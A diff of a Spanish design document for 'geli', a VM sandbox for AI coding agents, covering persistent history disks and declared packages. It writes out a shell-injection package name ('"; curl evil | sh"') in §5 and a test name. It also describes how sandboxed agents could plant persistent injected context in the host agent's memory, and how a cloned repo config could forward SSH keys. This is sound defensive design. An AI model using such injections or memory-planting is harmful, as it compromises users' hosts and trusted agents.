@@ -1,164 +1,368 @@
-# Arquitectura y Diseño: Manejo del Historial Bidireccional por Proyecto en `geli`
+# Estado que sobrevive a la sesión: historial y herramientas
 
-Este documento detalla el análisis de cómo **Antigravity CLI (`agy`)** y **Claude Code (`claude`)** almacenan su historial en el host, los problemas de aislamiento al correr dentro de máquinas virtuales sandbox, y el diseño propuesto para sincronizar el historial **específico del proyecto abierto** de forma bidireccional.
+Una VM de `geli` es desechable, y eso tiene dos costes para quien la usa: el agente no encuentra el
+historial del proyecto, y las herramientas que necesitó la sesión anterior ya no están.
 
----
+Son dos problemas distintos, con ciclos de vida distintos, y se resuelven por separado:
 
-## 1. Contexto y Problema
-
-Actualmente `geli` ejecuta agentes dentro de máquinas virtuales aisladas (QEMU/KVM sobre Alpine Linux) montando el código fuente vía `9p` en `/workspace/<nombre_proyecto>`.
-
-- **Aislamiento de credenciales e historial:**
-  - Por diseño de seguridad, `geli` no copia todo el directorio `~/.gemini` ni `~/.claude` del host para no filtrar historiales de otros proyectos/clientes.
-  - Sin embargo, al iniciar una sesión sandbox, el agente no encuentra el historial previo del proyecto abierto (imposibilitando reanudar conversaciones con `/resume` o mantener el hilo de contexto).
-  - Asimismo, al cerrarse la VM efímera, cualquier conversación nueva generada dentro del sandbox se destruye con la máquina.
+- **El historial** vive en un **qcow2 persistente por `(workspace, agente)`** que el host no lee y
+  que nada invalida.
+- **Las herramientas** se **declaran en `.geli.json`** y se reinstalan en cada arranque desde
+  caché. La raíz de la VM sigue siendo desechable.
 
 ---
 
-## 2. Estructura del Historial por Agente
+## 1. El problema
 
-### A. Antigravity CLI (`agy`)
+`geli` corre agentes en VMs desechables montando el código por 9p en `/workspace/<proyecto>`. Por
+diseño no copia `~/.claude` ni `~/.gemini` enteros: ahí vive el historial de todos los proyectos y
+de todos los clientes. La consecuencia es doble:
 
-`agy` guarda su estado en `~/.gemini/antigravity-cli/`:
-
-1. **`conversation_summaries.db` (SQLite):**
-   - Tabla `conversation_summaries`.
-   - Contiene metadatos de todas las conversaciones.
-   - Columna clave: `workspace_uris` (ejemplo: `["file:///home/pkarc/github/geli"]`).
-   - Relaciona cada `conversation_id` con la ruta absoluta del workspace en el host.
-
-2. **`conversations/<conversation_id>.db` (SQLite por conversación):**
-   - Almacena el log detallado de pasos, checkpoints, tool calls y contexto de la conversación.
-
-3. **`brain/<conversation_id>/` (Directorio de artefactos y logs):**
-   - Contiene artefactos generados, transcripciones (`transcript.jsonl`, `transcript_full.jsonl`) y logs de tareas en background.
+- Al entrar, el agente no encuentra nada previo — no hay `/resume`, no hay hilo de contexto.
+- Al salir, la VM se lleva consigo todo lo que se conversó dentro, y también cualquier `apk add` o
+  `npm i -g` que hiciera falta para trabajar.
 
 ---
 
-### B. Claude Code (`claude`)
+## 2. Dónde guarda cada agente su historial
 
-`claude` almacena su historial de forma modular en `~/.claude/`:
+### Claude Code
 
-1. **`~/.claude/projects/<slug_directorio>/`:**
-   - Para cada proyecto en el host se genera un slug basado en la ruta absoluta, reemplazando `/` por `-`.
-   - Ejemplo: `/home/pkarc/github/geli` $\rightarrow$ `~/.claude/projects/-home-pkarc-github-geli/`
-   - Dentro contiene:
-     - Archivos de sesión: `<session_id>.jsonl`
-     - Carpeta `memory/` (memorias persistentes del proyecto).
+`~/.claude/projects/<slug>/`, donde el slug es la ruta absoluta con `/` → `-`:
 
----
-
-## 3. Desafío Técnico: Diferencia de Rutas Host vs Guest
-
-| Entorno | Ruta del Proyecto | URI en Base de Datos (`agy`) | Slug de Carpeta (`claude`) |
-| :--- | :--- | :--- | :--- |
-| **Host** | `/home/pkarc/github/geli` | `file:///home/pkarc/github/geli` | `-home-pkarc-github-geli` |
-| **Guest (VM)** | `/workspace/geli` | `file:///workspace/geli` | `-workspace-geli` |
-
-Si se montara o copiara directamente sin transformar:
-- `agy` en el guest ignoraría las conversaciones porque buscaría `file:///workspace/geli`.
-- `claude` buscaría `~/.claude/projects/-workspace-geli/` y no encontraría las sesiones de `-home-pkarc-github-geli/`.
-
----
-
-## 4. Diseño Propuesto: Sincronización Bidireccional
-
-### Flujo de Ejecución
-
-```mermaid
-sequenceDiagram
-    participant Host as Host (geli)
-    participant Staging as Staging Share Directory
-    participant Guest as Sandbox Guest VM
-
-    Note over Host,Staging: 1. PRE-BOOT (Filtrado & Preparación)
-    Host->>Staging: Filtrar conversaciones del proyecto actual
-    Host->>Staging: Copiar .db y brain/ correspondientes
-    Host->>Staging: Generar conversation_summaries.db y -workspace-<slug> con rutas /workspace/
-
-    Note over Staging,Guest: 2. BOOT & SESIÓN
-    Guest->>Staging: 9p mount /etc/geli/history o copia a ~/.gemini y ~/.claude
-    Guest->>Guest: El agente lee historial previo y genera nuevas sesiones
-
-    Note over Guest,Staging: 3. SHUTDOWN & TEARDOWN
-    Guest->>Guest: Sincroniza flush a disco y apaga VM
-    Host->>Staging: Detecta nuevas sesiones / actualizaciones
-    Host->>Host: Reescribe /workspace/ a /home/pkarc/... e inserta en DB/carpetas del host
+```
+/home/pkarc/github/geli  →  ~/.claude/projects/-home-pkarc-github-geli/
+                              ├── 4bc0736e-….jsonl      342 KB
+                              ├── 83bc45b2-….jsonl       11 MB   (una sola sesión)
+                              └── memory/
 ```
 
----
+**Medido: 11 MB en una sola sesión de este proyecto** — el historial no es pequeño y crece por
+sesión, no por proyecto.
 
-### Detalle de Implementación
+### Antigravity CLI
 
-### 1. Pre-Boot (Host $\rightarrow$ Guest)
+`~/.gemini/antigravity-cli/`, medido en este host:
 
-1. **Identificación de rutas:**
-   - Obtener ruta canónica del host: `host_dir = /home/pkarc/github/geli`
-   - Obtener ruta en el guest: `guest_dir = /workspace/geli`
+| | tamaño | qué es |
+| :--- | ---: | :--- |
+| `conversation_summaries.db` | 152 KB | índice SQLite **global**: 88 conversaciones de todos los proyectos |
+| `conversations/<cid>.db` | 334 MB | el log detallado, una DB por conversación |
+| `brain/<cid>/` | 1.3 GB | artefactos, `transcript.jsonl`, logs de tareas |
 
-2. **Para `agy`:**
-   - En el directorio temporal `staging_dir/history/gemini/`:
-     - Crear una base SQLite `conversation_summaries.db` efímera con el mismo esquema.
-     - Adjuntar (`ATTACH DATABASE`) la base del host y ejecutar:
-       ```sql
-       INSERT INTO conversation_summaries
-       SELECT conversation_id, title, preview, step_count, last_modified_time,
-              replace(workspace_uris, '<host_dir>', '<guest_dir>'),
-              status, source, project_id, agent_name, parent_conversation_id,
-              nesting_depth, battle_id, winning_conversation_id, not_fully_idle,
-              killed, last_user_input_time, last_user_input_step_index, app_data_dir,
-              raw_summary, group_id
-       FROM host_db.conversation_summaries
-       WHERE workspace_uris LIKE '%<host_dir>%';
-       ```
-     - Copiar a `staging_dir/history/gemini/conversations/` solo los archivos `<cid>.db` de los IDs filtrados.
-     - Copiar a `staging_dir/history/gemini/brain/` las carpetas `<cid>/` correspondientes.
-
-3. **Para `claude`:**
-   - Calcular slug host: `-home-pkarc-github-geli`
-   - Calcular slug guest: `-workspace-geli`
-   - Si existe `~/.claude/projects/-home-pkarc-github-geli/`, copiar su contenido a `staging_dir/history/claude/projects/-workspace-geli/`.
+Dos hechos importan: **el índice es global** — un fichero, todos los proyectos — y **parte del
+historial de `agy` vive en SQLite**, no en ficheros sueltos.
 
 ---
 
-### 2. Ejecución en el Guest
+## 3. Por qué el historial no se sincroniza con el host
 
-- En [`session.yaml`](file:///home/pkarc/github/geli/src/guest/session.yaml) / [`mounts.sh`](file:///home/pkarc/github/geli/src/guest/mounts.sh):
-  - Montar el directorio de staging o copiar los archivos hacia `/home/sandbox/.gemini/antigravity-cli/` y `/home/sandbox/.claude/`.
-  - Asegurar permisos `chown -R sandbox:sandbox`.
+**El historial del sandbox nace y vive dentro del sandbox. El host no lo lee y el sandbox no
+escribe en el host.**
+
+Es una tercera categoría, distinta de las dos que `geli` ya tiene: `credentials` copia verbatim del
+home del usuario, `seed_files` sintetiza de la nada y **no lee el host a propósito**. El historial
+no hace ninguna de las dos: se acumula.
+
+La alternativa obvia — filtrar del host lo del proyecto abierto, traducir rutas y devolver al final
+lo generado dentro — está descartada en el **apéndice A**, con los cinco problemas que arrastraba.
+El resumen es que **la dirección de vuelta es el problema**: escribir en
+`~/.claude/projects/<slug>/memory/` desde el sandbox planta contexto que el Claude Code *de
+confianza* del host carga en cada sesión futura, fuera de la VM, indefinidamente. Es un canal de
+inyección persistente, inherente a sincronizar.
+
+### Lo que esta decisión hace desaparecer
+
+Dentro del disco la ruta del proyecto es **siempre** `/workspace/geli`, en todas las sesiones. Por
+tanto: no hay traducción de rutas, no hay que filtrar `workspace_uris` (el índice de `agy` dentro
+del disco nunca tuvo otra cosa), no entra `rusqlite`, no hay manifiesto ni diff por `mtime` ni
+política de conflicto contra un `agy` del host abierto en otra ventana, y no hay carrera con el
+borrado del share dir. Deja de importar incluso si `claude` valida el `cwd` al reanudar: el `cwd`
+grabado y el real son el mismo.
+
+### Por qué un qcow2 y no un 9p como las cachés de npm y pip
+
+El patrón 9p también evitaría la inyección — los ficheros estarían en `~/.cache/geli-sandbox/`, no
+en `~/.claude/`, así que el agente del host no los leería jamás.
+
+Lo que lo descarta es `agy`: **SQLite sobre 9p tiene un bloqueo poco fiable**. Un qcow2 lleva un
+sistema de ficheros real dentro, con locking POSIX y `fsync` de verdad. Si la mitad del historial
+que queremos conservar es una base de datos, eso decide.
+
+De regalo, el disco es opaco: no acaba en el backup del host, ni en un `grep -r ~`, ni sincronizado
+a una nube por accidente.
 
 ---
 
-### 3. Post-Run Sync (Guest $\rightarrow$ Host)
+## 4. El disco de historial
 
-Cuando QEMU finaliza su ejecución (`child.wait()`):
+Un fichero por workspace y agente, **fuera de la cadena de respaldo**:
 
-1. **Para `agy`:**
-   - Abrir la base del host `~/.gemini/antigravity-cli/conversation_summaries.db`.
-   - Adjuntar la base que modificó el guest:
-     ```sql
-     INSERT OR REPLACE INTO conversation_summaries
-     SELECT conversation_id, title, preview, step_count, last_modified_time,
-            replace(workspace_uris, '<guest_dir>', '<host_dir>'),
-            status, source, project_id, agent_name, parent_conversation_id,
-            nesting_depth, battle_id, winning_conversation_id, not_fully_idle,
-            killed, last_user_input_time, last_user_input_step_index, app_data_dir,
-            raw_summary, group_id
-     FROM guest_db.conversation_summaries;
-     ```
-   - Copiar los nuevos o modificados `<cid>.db` a `~/.gemini/antigravity-cli/conversations/`.
-   - Copiar los nuevos o modificados directorios `brain/<cid>` a `~/.gemini/antigravity-cli/brain/`.
+```
+~/qemu-sandbox/geli-base.qcow2                      la imagen base
+~/qemu-sandbox/geli-layer-claude.qcow2              la capa del agente
+/tmp/sandbox-session-<pid>.qcow2                    la sesión        ← se borra al salir
+~/.local/share/geli/history-<ws>-<agente>.qcow2     el historial     ← persiste
+```
 
-2. **Para `claude`:**
-   - Copiar recursivamente los archivos de `staging_dir/history/claude/projects/-workspace-geli/` hacia `~/.claude/projects/-home-pkarc-github-geli/`.
+No es un overlay sobre nada: es un segundo disco independiente, enganchado como un `-drive` más en
+`qemu_args`, donde hoy se añaden los `-fsdev` de los 9p. La raíz de la VM se sigue tirando igual
+que ahora.
+
+**Que esté fuera de la cadena es el punto entero.** Un overlay sobre `geli-layer-claude.qcow2`
+dejaría de ser válido en cuanto esa capa se reconstruyera — cambia la receta, upstream se mueve,
+alguien corre `--build-image` — que es la regla que ya aplica `discard_layers`. Es decir:
+**actualizar el agente te borraría el historial**, un efecto que nadie espera y que se descubre
+cuando ya pasó. Las conversaciones tienen que vivir en algo cuyo ciclo de vida no dependa de la
+imagen. Rebasear el overlay a la capa nueva con `qemu-img rebase` es técnicamente posible y
+prácticamente una fábrica de corrupción: el contenido asume los ficheros de la capa vieja.
+
+### La clave es `(workspace, agente)`
+
+Ni sólo por agente, que mezclaría proyectos y reintroduciría justo la fuga que motivó todo esto. Ni
+sólo por workspace, que mezclaría formatos de agentes distintos y pondría el estado de uno al
+alcance del otro — lo contrario del aislamiento de credenciales por agente que ya existe.
+
+El nombre sale del workspace (ya saneado a minúsculas, alfanuméricos y `-`, porque es nombre de
+fichero y hostname) y de `agent.command`, igual que las capas derivan el suyo dentro de
+`ensure_layer`. Un solo sitio del que sale el nombre, para que no haya dos que puedan discrepar.
+
+### Qué se persiste, y qué no
+
+**Sólo las rutas de historial. Nunca el home entero.**
+
+Esto es lo más fácil de hacer mal. Si montas todo `~/.claude` en el disco persistente, persistes
+también `.credentials.json` y el `.claude.json` sembrado — y ahí se rompe la historia de
+credenciales, que es efímera a propósito y se reconstruye cada sesión desde el host. Una credencial
+rotada en el host seguiría viva dentro del disco.
+
+| agente | se persiste |
+| :--- | :--- |
+| `claude` | `~/.claude/projects/-workspace-<carpeta>/` |
+| `agy` | `~/.gemini/antigravity-cli/{conversation_summaries.db,conversations/,brain/}` |
+
+Vive en un `match`, con la misma justificación que `seed_files`: saber qué subdirectorio de un
+agente es historial y cuál es credencial exige conocer ese agente, y un campo TOML suficientemente
+expresivo para decirlo sería un lenguaje de programación con peor ergonomía. Todo lo demás del
+agente sigue siendo datos en `agents/*.toml`.
+
+El disco se monta en un punto neutro (`/var/lib/geli-history`) y esas rutas se enlazan dentro, en
+`mounts.sh`, como root, **antes de la marca de preparado** — si no, el agente puede arrancar antes
+de tener su historial, el mismo razonamiento por el que el cierre de red va donde va.
+
+### Concurrencia
+
+Dos sesiones del mismo workspace y agente corrompen el disco si ambas lo abren en escritura. Ya
+existe el cerrojo `O_EXCL` con pid de `try_build_lock`, con `lock_holder_alive` para que una sesión
+muerta no bloquee a las siguientes.
+
+Pero **bloquear aquí es mala UX**: esperar a que se construya una capa tiene sentido, esperar para
+abrir una sesión no. La primera abre el disco en escritura; las demás corren sobre un overlay
+desechable encima del disco persistente — funcionan, ven el historial, no persisten, y el bloque de
+estado lo dice. Es el vocabulario de overlays que el proyecto ya habla.
 
 ---
 
-## 5. Ventajas de esta Arquitectura
+## 5. Las herramientas: declarar, no acumular
 
-1. **Privacidad & Seguridad Total:**
-   - El sandbox **solo** ve y contiene el historial del proyecto en el que se ejecuta. Las conversaciones de otros clientes o proyectos no viajan a la máquina virtual.
-2. **Continuidad de Contexto:**
-   - Permite usar comandos como `/resume` o recordar decisiones tomadas en sesiones pasadas tanto en `agy` como en `claude`.
-3. **Persistencia Transparente:**
-   - Todas las sesiones y artefactos creados dentro del sandbox quedan guardados en el host de manera natural.
+Un agente que necesita `ripgrep` o `jq` lo instala, y la sesión siguiente no lo tiene. La respuesta
+**no** es conservar el overlay de la raíz (apéndice C), sino declarar lo que el proyecto necesita:
+
+```json
+{
+  "workspace": "geli",
+  "history": true,
+  "packages": {
+    "apk": ["ripgrep", "jq"],
+    "npm": ["prettier"]
+  }
+}
+```
+
+Se instala en cada arranque desde caché local. La raíz sigue siendo desechable, lo que el agente
+ensucie se tira, y la lista sobrevive a reconstrucciones de capa y de base porque no es una imagen:
+es texto en el repositorio.
+
+Lo que no cubre, y hay que decirlo: **no captura lo que el agente instaló sin que nadie lo
+declarara.** Esa sesión lo tiene; la siguiente no, hasta que alguien lo escriba en `.geli.json`. Es
+el precio de que el resultado sea reproducible en vez de acumulado — y el mismo trato que `geli` ya
+le da al resto de la configuración del guest.
+
+### Hace falta compartir la caché de apk
+
+Hoy hay dos 9p de caché, `~/.cache/geli-sandbox/{npm,pip}`. Sin un tercero para `apk`
+(`/etc/apk/cache` en el invitado), cada arranque se bajaría los paquetes otra vez por red, lo que
+convierte una lista de tres paquetes en varios segundos de arranque y en una dependencia de la red
+para empezar a trabajar. Es la misma razón por la que existen los otros dos.
+
+### Dónde corre, y qué pasa si falla
+
+En `mounts.sh`, como root, **antes de la marca de preparado**: un agente que arranca antes de tener
+sus herramientas es exactamente el problema que esto venía a resolver.
+
+Un paquete que no instala **avisa y sigue**, no apaga la VM. El contraste es con el cierre de red,
+que sí apaga: ahí el bloque de estado ya ha afirmado que el egress está restringido y seguir sería
+mentir. Aquí no hay ninguna afirmación que se rompa — el agente se queda sin una herramienta y lo
+verá en cuanto la use.
+
+**El coste de arranque hay que medirlo.** Una sesión arranca hoy en ~9 s, y eso costó trabajo. `apk
+add` desde caché es barato; `npm i -g` no lo es tanto. Si la lista típica mete segundos
+apreciables, la respuesta es hornear una capa por workspace, no resignarse — pero eso es una
+decisión posterior y con número delante.
+
+### `.geli.json` no es un fichero de confianza
+
+Está en el directorio del proyecto, así que **puede venir en un repositorio clonado**. Dos
+consecuencias:
+
+- **Los nombres de paquete se sanean.** Van a un shell como root, y `"; curl evil | sh"` es
+  inyección trivial. El daño queda dentro de la VM y bajo la política de egress, pero dejar abierta
+  una inyección a root porque está contenida es la clase de atajo que envejece mal. Alfanuméricos,
+  `-`, `_`, `.`, `+`, `@` y `/` para scopes de npm; cualquier otra cosa se rechaza con un error que
+  nombra el paquete.
+- **Instalar paquetes porque lo dijo un fichero del repositorio es, en sí, una decisión del
+  usuario.** Queda contenido en la VM, que es para lo que está, y el bloque de estado nombra lo que
+  se va a instalar antes de arrancar.
+
+Esto no es un problema nuevo que traiga `packages`, y conviene escribirlo aquí porque la respuesta
+debería ser la misma para los tres campos: hoy `.geli.json` también lleva `allow`, que ensancha la
+lista de egress, y `ssh`, que en `main.rs:90` entra en `forward_ssh` junto al flag — un repositorio
+que traiga `{"ssh": true}` reenvía las claves SSH del usuario sin que nadie teclee `--ssh`, que es
+lo contrario de lo que CLAUDE.md dice de esa bandera. **Se trata aparte de este diseño**, pero
+`packages` no debe añadirse como si el fichero fuera de fiar.
+
+---
+
+## 6. Lo que esto cuesta
+
+### El día uno está vacío
+
+Lo que conversaste con `claude` fuera de geli no aparece nunca dentro. Es la única regresión real
+frente a sincronizar, y es deliberada: sembrar desde el host devuelve el filtro exacto por
+`workspace_uris`, `rusqlite` y la traducción de rutas — todo el coste del apéndice A — para
+resolver un problema que dura una sesión.
+
+Si más adelante se echa de menos, **se puede añadir sin tocar nada de esto**: una siembra inicial,
+de ida y una sola vez, escribe en un disco que ya existe. Lo que no vuelve a entrar en discusión es
+la dirección de vuelta.
+
+### "The session leaves nothing behind" deja de ser cierto sin matices
+
+Es una propiedad de cabecera del proyecto y ahora tiene una excepción acotada — un disco de datos,
+no la raíz — así que la excepción tiene que ser explícita. **Se pregunta una vez por workspace y se
+guarda en `.geli.json`**, que ya tiene el precedente exacto:
+
+```
+[?] Enable SSH forwarding permanently for workspace 'geli' in .geli.json? (y/N):
+```
+
+Un flag que hay que teclear cada vez convierte la continuidad en fricción, que es el problema que
+veníamos a resolver. El bloque de estado dice en cada sesión si el historial es persistente, igual
+que nombra montajes y credenciales: un disco que persiste sin que se vea es la clase de cosa que se
+descubre tarde.
+
+### La contaminación persiste dentro del linaje del sandbox
+
+Un agente comprometido puede dejar algo en ese disco y encontrárselo la sesión siguiente del mismo
+workspace y agente. Está acotado a ficheros de datos — la raíz no persiste, así que no hay binarios
+ni `PATH` ni unidades de arranque que plantar — y no llega al host, ni a otro proyecto, ni a otro
+agente. Se mata borrando un fichero.
+
+Hace falta poder borrarlo y poder mirarlo: `--reset-history` y alguna forma de exportar, porque un
+disco opaco que no se puede inspeccionar es un sitio donde esconder cosas.
+
+### Borrar dentro no encoge el qcow2
+
+La lección del `fstrim` de la receta base aplica igual: montar con `discard` y dejar sitio para
+podar. Con `brain/` creciendo a 1.3 GB en el host, no es teórico.
+
+---
+
+## 7. Qué se prueba sin arrancar una VM
+
+- `history_disk_name_is_keyed_by_workspace_and_agent` — dos agentes en un workspace no comparten
+  fichero, ni dos workspaces en un agente.
+- `history_persists_no_credentials` — gemelo de
+  `recipes_do_not_claim_credentials_that_are_really_seeded`: falla si una ruta persistida pisa una
+  de `credentials` o de `seed_files`.
+- `history_paths_are_guest_only` — ninguna ruta persistida sale del árbol del guest ni menciona el
+  home del host.
+- `history_is_opt_in` — sin el ajuste en `.geli.json`, no se engancha ningún disco.
+- `package_names_reject_shell_metacharacters` — `"; curl evil | sh"` no llega al guest.
+- `local_config_without_packages_still_parses` — gemelo del que ya existe para `allow`: los
+  `.geli.json` que hay en disco siguen cargando.
+
+---
+
+## 8. Qué da y qué no
+
+**Da:** continuidad entre sesiones desechables (`/resume` funciona), persistencia de lo conversado
+dentro, herramientas del proyecto disponibles desde el primer segundo, y cero datos del usuario
+cruzando hacia la VM por esta vía.
+
+**No da:** continuidad con lo que hiciste fuera de geli, historial compartido entre dos workspaces
+que miran el mismo repositorio, ni conservación de lo que el agente instaló sin declararlo.
+
+---
+
+## Apéndice A — descartado: sincronizar con el historial del host
+
+Filtrar del host las conversaciones del proyecto abierto, traducir las rutas a `/workspace/`,
+copiarlas al staging y al terminar devolver al host lo generado dentro. Funciona, y cinco cosas lo
+hacen caro:
+
+1. **El filtro es fácil de hacer mal.** `workspace_uris LIKE '%<ruta>%'` falla en dos direcciones,
+   y las dos están presentes en este host: casa `geli-extra` cuando pides `geli`, y **2 de las 88
+   filas tienen más de un workspace** — una con `geli` y otro proyecto arrastraría al sandbox el
+   título, el `preview` y el `raw_summary` del segundo. El filtro correcto parsea el array JSON y
+   compara elemento a elemento. Es el incidente de `trustedFolders.json` otra vez.
+2. **La traducción de rutas es parcial por construcción.** Se reescribe el índice; no los
+   `transcript.jsonl` de `brain/`, ni el `raw_summary` (un BLOB protobuf), ni los `cwd` dentro de
+   cada `.jsonl` de `claude`.
+3. **La vuelta es un canal de inyección hacia el host**, que es la razón de fondo. Ver §3.
+4. **La escritura compite con el host.** Un `INSERT OR REPLACE` ciego contra un `agy` abierto en
+   otra ventana es una actualización perdida.
+5. **El sync tiene que correr antes del teardown y en todos los caminos sucios** — el `poweroff`
+   del lockdown, un kill, un cloud-init roto — y ser idempotente.
+
+Más `rusqlite` como primera dependencia pesada, y dos cosas que había que medir antes de poder
+estimar el trabajo (si `claude` valida el `cwd` al reanudar; si `--continue` exige `lastSessionId`
+en `~/.claude.json`, lo que chocaría con `claude_config_holds_only_what_suppresses_the_prompts`).
+
+El disco persistente hace desaparecer los cinco, la dependencia y las dos mediciones.
+
+## Apéndice B — descartado: montar el directorio del host por 9p
+
+Para `claude` el problema parece disolverse solo: el slug **es un nombre de directorio**, así que
+montar `~/.claude/projects/-home-pkarc-github-geli` del host en
+`/home/sandbox/.claude/projects/-workspace-geli` del guest da traducción de ruta,
+bidireccionalidad y persistencia sin una línea de sincronización y sin copia.
+
+**Se descarta porque regala justo lo que hay que controlar.** Un montaje es un canal de escritura
+directo y sin validar desde el sandbox al home del usuario: el guest puede corromper o borrar el
+historial real y plantar ficheros en `memory/` sin que nada los mire. El problema del apéndice A.3
+deja de ser resoluble y pasa a ser estructural.
+
+Para `agy` ni siquiera es una opción: `conversation_summaries.db` es global, montarla expone las 88
+conversaciones, y SQLite sobre 9p tiene un bloqueo poco fiable.
+
+## Apéndice C — descartado: conservar el overlay de la raíz
+
+La forma barata de que las instalaciones sobrevivan: no borrar `/tmp/sandbox-session-<pid>.qcow2`,
+guardar uno por `(workspace, agente)` y reusarlo. Persiste todo — `apk add`, `npm i -g`, el
+historial de propina — sin declarar nada y sin mapear rutas por agente.
+
+Se descarta por tres razones, y la primera basta:
+
+1. **Se invalida al reconstruir la capa.** El overlay se apoya en `geli-layer-<agente>.qcow2`; si
+   esa capa se rehace, el respaldo ya no existe. Si el historial viviera ahí, actualizar el agente
+   lo borraría. Por eso el historial va en un disco **fuera** de la cadena (§4) y por eso, aunque
+   se quisiera el overlay, harían falta dos discos igualmente.
+2. **La VM deja de ser fresca de verdad.** La contaminación pasa de ser ficheros de datos a ser la
+   raíz entera: binarios, `PATH`, lo que el agente dejara en `/etc`. Sigue sin llegar al host, pero
+   dentro de ese linaje un agente comprometido tiene punto de apoyo permanente.
+3. **Acumula sin límite y sin registro.** Nadie sabe qué hay dentro ni por qué, y "funciona en mi
+   sandbox" vuelve a ser una frase posible.
+
+La alternativa declarativa (§5) cuesta escribir una lista y devuelve reproducibilidad: sobrevive a
+reconstrucciones, se revisa en un diff y se explica sola.
